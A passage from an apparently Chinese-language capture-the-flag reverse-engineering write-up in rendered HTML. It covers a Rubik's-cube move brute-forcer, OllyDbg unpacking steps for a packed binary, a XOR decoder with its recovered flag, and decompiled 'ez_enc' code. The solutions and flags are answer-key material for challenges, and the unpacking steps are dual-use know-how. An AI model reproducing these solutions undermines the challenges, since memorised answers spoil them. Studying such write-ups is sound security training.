punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"yellow"</span>        white<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"white"</span>    blue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"red"</span>    red<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"green"</span>    green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">MOVE_R</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    v2 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    v3 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> white<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> white<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> white<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    white<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    white<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    white<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1    yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> v2    yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3    v4 <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4    v5 <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token keyword">def</span> <span class="token function">MOVE_U</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    v2 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    v3 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> blue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> blue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> blue<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    blue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1    blue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v2    blue<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3    v4 <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4    v5 <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token keyword">def</span> <span class="token function">MOVE_r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    v2 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    v3 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> white<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> white<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> white<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    white<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1    white<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> v2    white<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3    v4 <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4    v5 <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token keyword">def</span> <span class="token function">MOVE_u</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    v2 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    v3 <span class="token operator">=</span> red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> blue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> blue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    red<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> blue<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    blue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    blue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    blue<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> orange<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    orange<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    green<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1    green<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v2    green<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3    v4 <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4    v5 <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> yellow<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    yellow<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token keyword">def</span> <span class="token function">is_right</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> red<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"red"</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> blue<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"blue"</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> green<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"green"</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> orange<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"orange"</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> yellow<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"yellow"</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> white<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"white"</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">return</span> flag<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    init_cube<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">:</span>            MOVE_R<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">"U"</span><span class="token punctuation">:</span>            MOVE_U<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">"r"</span><span class="token punctuation">:</span>            MOVE_r<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">"u"</span><span class="token punctuation">:</span>            MOVE_u<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> is_right<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flag<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table<span class="token operator">=</span><span class="token string">"RrUu"</span>    <span class="token keyword">for</span> string <span class="token keyword">in</span> product<span class="token punctuation">(</span>table<span class="token punctuation">,</span>repeat<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>string<span class="token punctuation">)</span>        ret<span class="token operator">=</span>main<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">if</span> ret <span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>            <span class="token keyword">return</span>get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#RuRURURuruRR</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="砸核桃"><a class="markdownIt-Anchor" href="#砸核桃"></a> 砸核桃</h3><p>188637</p><p>ASP壳，用od脱一下壳</p><p>[<a href="https://bbs.kanxue.com/thread-255443.htm">原创]新手 NsPacK3.7 脱壳记录-加壳脱壳-看雪-安全社区|安全招聘|kanxue.com</a></p><pre class="line-numbers language-none"><code class="language-none">4.2 寻找OEP经过修改后的 PE 文件已经可以正常识别了，同样也显示出相应的编译信息与壳的信息，NsPacK V3.7 中文名称为北斗壳，是国内人编写的压缩壳。既然是手工对其脱壳，自然第一步就是寻找 OEP（原始入口点）。ollydbg 载入后入口点处为：pushfd，pushad，call XXXXOEP 的特征如下：popad，popfd，jmp OEP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我采用了搜索popfd打断点 不断F9到OEP的位置</p><p>然后按照教程fixdump得到主函数（现在对windowsPE结构不太懂，不了解为什么要按照这个步骤来，以后有时间进行学习</p><p>189348</p><p>发现是个简单的异或</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">]</span>enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x00000012</span><span class="token punctuation">,</span> <span class="token number">0x00000004</span><span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">,</span> <span class="token number">0x0000005C</span><span class="token punctuation">,</span> <span class="token number">0x0000004A</span><span class="token punctuation">,</span> <span class="token number">0x0000003D</span><span class="token punctuation">,</span> <span class="token number">0x00000056</span><span class="token punctuation">,</span> <span class="token number">0x0000000A</span><span class="token punctuation">,</span> <span class="token number">0x00000010</span><span class="token punctuation">,</span> <span class="token number">0x00000067</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000041</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000001</span><span class="token punctuation">,</span> <span class="token number">0x00000046</span><span class="token punctuation">,</span> <span class="token number">0x0000005A</span><span class="token punctuation">,</span> <span class="token number">0x00000044</span><span class="token punctuation">,</span> <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0x0000006E</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x00000044</span><span class="token punctuation">,</span> <span class="token number">0x00000072</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x0000000D</span><span class="token punctuation">,</span> <span class="token number">0x00000040</span><span class="token punctuation">,</span> <span class="token number">0x0000003E</span><span class="token punctuation">,</span> <span class="token number">0x0000004B</span><span class="token punctuation">,</span> <span class="token number">0x0000005F</span><span class="token punctuation">,</span> <span class="token number">0x00000002</span><span class="token punctuation">,</span> <span class="token number">0x00000001</span><span class="token punctuation">,</span> <span class="token number">0x0000004C</span><span class="token punctuation">,</span> <span class="token number">0x0000005E</span><span class="token punctuation">,</span> <span class="token number">0x0000005B</span><span class="token punctuation">,</span> <span class="token number">0x00000017</span><span class="token punctuation">,</span> <span class="token number">0x0000006E</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x00000016</span><span class="token punctuation">,</span> <span class="token number">0x00000068</span><span class="token punctuation">,</span> <span class="token number">0x0000005B</span><span class="token punctuation">,</span> <span class="token number">0x00000012</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000048</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ez_enc"><a class="markdownIt-Anchor" href="#ez_enc"></a> ez_enc</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> input_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">j_strlen</span><span class="token punctuation">(</span>input_<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  input_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> aImouto<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>input_<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>input_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strlen</span><span class="token punctuation">(</span>input_<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> input_<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_14001E008<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Right,but where is my Imouto?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 